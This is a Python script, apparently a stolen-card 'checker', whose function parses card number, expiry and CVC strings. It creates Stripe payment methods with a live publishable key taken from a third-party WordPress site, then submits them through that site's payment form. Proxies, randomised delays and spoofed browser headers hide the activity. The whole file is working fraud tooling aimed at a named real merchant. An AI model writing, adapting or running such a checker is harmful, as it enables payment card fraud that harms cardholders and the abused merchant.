import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=0e7090cc-1444-45cf-9584-1bd6d3bb15d1a837cf&sid=c9adb9fe-f6ec-4ae3-b447-e0a5651c695ecd07f6&payment_user_agent=stripe.js%2F13dc22628e%3B+stripe-js-v3%2F13dc22628e%3B+card-element&referrer=https%3A%2F%2Fgalwaybdgroup.com&time_on_page=33449&key=pk_live_51IXn9gCjCb8tOn17jeSErBz0QdYjX8cbEuCPcjwo30QUpyupLAxotfh16BIv82hifJPHWFhGrKF2pCkF40Wp3Xac00CTx01pfh"
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxies=genProxy(),
        )

        pm = r1.json()["id"]
        

        cookies = {
            '_lscache_vary': '38044d5f7e1e4c9647b1e2da323481a1',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgalwaybdgroup.com%2Fsample-page%2F',
            '__stripe_mid': '0e7090cc-1444-45cf-9584-1bd6d3bb15d1a837cf',
            '__stripe_sid': 'c9adb9fe-f6ec-4ae3-b447-e0a5651c695ecd07f6',
        }
        
        headers = {
            'authority': 'galwaybdgroup.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://galwaybdgroup.com',
            'referer': 'https://galwaybdgroup.com/sample-page/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1732271525835',
        }
        
        data = {
            'data': f'lrR7vxSQG1Rs=YPO8732mXxvYhJLgTcD8KXMUQTnrd4n3dgVs9SQJ3Fp28kxo4qMIkjTgEvjkjrul&__fluent_form_embded_post_id=2&_fluentform_2_fluentformnonce=13ab03e84f&_wp_http_referer=%2Fsample-page%2F&email=thur07656%40gmail.com&payment_input=0&payment_method=stripe&__stripe_payment_method_id={pm}',
            'action': 'fluentform_submit',
            'form_id': '2',
        }

        r2 = requests.post(
            "https://galwaybdgroup.com/wp-admin/admin-ajax.php",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=genProxy(),
        )
        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
